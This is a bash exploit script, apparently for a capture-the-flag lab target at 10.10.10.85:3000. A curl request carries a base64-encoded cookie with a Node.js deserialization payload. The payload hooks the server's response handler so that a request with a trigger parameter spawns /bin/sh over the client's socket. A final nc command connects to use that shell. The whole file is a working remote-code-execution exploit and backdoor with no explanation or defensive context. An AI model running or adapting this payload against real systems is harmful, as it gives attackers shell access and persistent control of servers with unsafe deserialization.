#!/bin/bash

curl -i -s -k  -X $'GET' \
    -H $'Host: 10.10.10.85:3000' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Cookie: profile=eyJ1c2VybmFtZSI6ImlmY29uZmlnIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIiLCJleGVjIjoiXyQkTkRfRlVOQyQkX3JlcXVpcmUoJ2h0dHAnKS5TZXJ2ZXJSZXNwb25zZS5wcm90b3R5cGUuZW5kID0gKGZ1bmN0aW9uIChlbmQpIHtcclxuICByZXR1cm4gZnVuY3Rpb24gKCkge1xyXG4gICAgaWYgKHRoaXMuc29ja2V0Ll9odHRwTWVzc2FnZS5yZXEucXVlcnkucSA9PT0gJ2FiYzEyMycpIHtcclxuICAgICAgICBbJ2Nsb3NlJywgJ2Nvbm5lY3QnLCAnZGF0YScsICdkcmFpbicsICdlbmQnLCAnZXJyb3InLCAnbG9va3VwJywgJ3RpbWVvdXQnLCAnJ10uZm9yRWFjaCh0aGlzLnNvY2tldC5yZW1vdmVBbGxMaXN0ZW5lcnMuYmluZCh0aGlzLnNvY2tldCkpXHJcbiAgICAgICAgdmFyIGNwID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpXHJcbiAgICAgICAgdmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpXHJcbiAgICAgICAgdmFyIHNoID0gY3Auc3Bhd24oJy9iaW4vc2gnKVxyXG4gICAgICAgIHNoLnN0ZG91dC5waXBlKHRoaXMuc29ja2V0KVxyXG4gICAgICAgIHNoLnN0ZGVyci5waXBlKHRoaXMuc29ja2V0KVxyXG4gICAgICAgIHRoaXMuc29ja2V0LnBpcGUoc2guc3RkaW4pXHJcbiAgICB9IGVsc2Uge1xyXG4gICAgICAgIGVuZC5hcHBseSh0aGlzLCBhcmd1bWVudHMpXHJcbiAgICB9XHJcbiAgfVxyXG59KShyZXF1aXJlKCdodHRwJykuU2VydmVyUmVzcG9uc2UucHJvdG90eXBlLmVuZCkifQ%3D%3D' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'If-None-Match: W/\"15-iqbh0nIIVq2tZl3LRUnGx4TH3xg\"' \
    -b $'profile=eyJ1c2VybmFtZSI6ImlmY29uZmlnIiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIiLCJleGVjIjoiXyQkTkRfRlVOQyQkX3JlcXVpcmUoJ2h0dHAnKS5TZXJ2ZXJSZXNwb25zZS5wcm90b3R5cGUuZW5kID0gKGZ1bmN0aW9uIChlbmQpIHtcclxuICByZXR1cm4gZnVuY3Rpb24gKCkge1xyXG4gICAgaWYgKHRoaXMuc29ja2V0Ll9odHRwTWVzc2FnZS5yZXEucXVlcnkucSA9PT0gJ2FiYzEyMycpIHtcclxuICAgICAgICBbJ2Nsb3NlJywgJ2Nvbm5lY3QnLCAnZGF0YScsICdkcmFpbicsICdlbmQnLCAnZXJyb3InLCAnbG9va3VwJywgJ3RpbWVvdXQnLCAnJ10uZm9yRWFjaCh0aGlzLnNvY2tldC5yZW1vdmVBbGxMaXN0ZW5lcnMuYmluZCh0aGlzLnNvY2tldCkpXHJcbiAgICAgICAgdmFyIGNwID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpXHJcbiAgICAgICAgdmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpXHJcbiAgICAgICAgdmFyIHNoID0gY3Auc3Bhd24oJy9iaW4vc2gnKVxyXG4gICAgICAgIHNoLnN0ZG91dC5waXBlKHRoaXMuc29ja2V0KVxyXG4gICAgICAgIHNoLnN0ZGVyci5waXBlKHRoaXMuc29ja2V0KVxyXG4gICAgICAgIHRoaXMuc29ja2V0LnBpcGUoc2guc3RkaW4pXHJcbiAgICB9IGVsc2Uge1xyXG4gICAgICAgIGVuZC5hcHBseSh0aGlzLCBhcmd1bWVudHMpXHJcbiAgICB9XHJcbiAgfVxyXG59KShyZXF1aXJlKCdodHRwJykuU2VydmVyUmVzcG9uc2UucHJvdG90eXBlLmVuZCkifQ%3D%3D' \
    $'http://10.10.10.85:3000/'

nc 10.10.10.85 3000
